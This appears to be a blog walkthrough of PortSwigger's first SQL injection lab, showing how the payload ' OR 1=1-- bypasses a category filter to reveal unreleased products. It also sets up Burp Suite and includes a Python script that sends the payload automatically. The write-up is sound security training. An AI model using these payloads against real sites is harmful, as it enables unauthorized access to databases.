---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# WHERE clause allowing retrieval of hidden data

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-4.png)

Lab #1 by PortSwigger Web Security Academy: [https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

### Description

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

### Steps

Upon accessing the lab and filtering on the `Pets` category, I noticed a GET parameter named `category` in the URL.

To test the application’s behavior, I initially tried adding a single quote (`'`) by navigating to `https://0abe00670490492181da436400ec000b.web-security-academy.net/filter?category='`.

This resulted in an `Internal Server Error`, which confirms that the application is indeed vulnerable.

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-1.png)

By adding a single quote (`'`) to the `category` parameter, the application executes the following query against the database:

```sql
SELECT * FROM products WHERE category = ''' AND released = 1
```

### Preparing a SQL injection Payload:

Let’s try replacing `'` with `'--`. The key thing here is that the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes `AND released = 1`.

**Expected Query:**

```sql
SELECT * FROM products WHERE category = ''-- AND released = 1
```

URL: `https://0abe00670490492181da436400ec000b.web-security-academy.net/filter?category='--`

As we can observe, the error disappeared, and the page returned no products. Perfect!

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-2.png)

Next, let’s try `' OR 1=1`, which will return the result of the following query:

```sql
SELECT * FROM products WHERE category = '' OR 1=1 -- AND released = 1
```

The modified query will return all items where either the category is empty (`''`) or `1=1`. Since `1=1` is always true, the query will return all items.

This solves Lab #1! Congratulations.

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-3.png)

However, we won’t stop here. Let’s go the extra mile and automate the SQLi payload. To begin, download Burp Suite Community Edition and ensure that the Proxy listener is enabled.

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-6.png)

Download the FoxyProxy extension and add the Burp Suite proxy address and port.

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-5.png)

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-7.png)

Enable the Burp proxy and navigate to the interface where Burp is running (`127.0.0.1:8080`). Save the CA certificate when prompted.&#x20;

<figure><img src="https://jawad.ca/images/sqli-lab01/sqli-lab1-10.png" alt=""><figcaption></figcaption></figure>

To prevent Firefox SSL errors when using Burp, import the certificate we just downloaded by going to `about:preferences#privacy` in Firefox.

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-11.png)

We are now ready to intercept our HTTP(s) traffic through Burp. As shown below, the intercept is on, and we can observe the GET `/filter?category=param` request.

![](https://jawad.ca/images/sqli-lab01/sqli-lab1-8.png)

To automate this SQL injection payload, we can use the below Python script:

```python
import requests  
import sys  
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
  
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}  
  
if __name__ == "__main__":  
	try:  
		url = sys.argv[1].strip()  
		payload = sys.argv[2].strip()  
	except IndexError:  
		print('Usage: %s <url> <payload> ; e.g www.example.com "1=1"' % sys.argv[0])  
		sys.exit(-1)  
  
uri = '/filter?category='  
r = requests.get(url + uri + payload, verify=False, proxies=proxies)  
  
# Congratulations message will show up only after solving the lab manually.  
if "Congratulations" in r.text:  
	print("it worked.")  
else:  
	print("Didn't work.")
```

To test our script with the Lab’s temporary URL and the payload we initially tested (`' OR 1=1--`), you can use the following command:

{% code overflow="wrap" %}
```powershell
python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
```
{% endcode %}

et voilà! [Little bobby tables](https://xkcd.com/327/) would be very happy :-)

![](https://jawad.ca/images/sqli-lab01/exploits\_of\_a\_mom.png)
